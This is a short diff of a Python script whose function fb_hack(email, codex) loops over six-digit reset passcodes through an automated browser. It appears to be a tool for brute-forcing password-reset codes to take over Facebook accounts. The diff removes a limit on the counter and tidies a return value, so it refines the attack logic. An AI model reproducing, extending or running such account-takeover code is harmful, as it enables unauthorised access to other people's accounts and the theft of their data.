@@ -140,8 +140,6 @@ def fb_hack(email, codex):
     print(check2)
     reset = int(codex)
   if check1 != test:
-    if reset > 999999:
-      reset = 999999
     while check1 == check3:
       browser.select_form(nr=0)
       y = passcode6(reset)
@@ -191,7 +189,7 @@ def fb_hack(email, codex):
       browser.close()
       reset = 0-1
       sys.exit()
-  return reset, y, 
+  return reset, y
 
 
 os.system('clear')
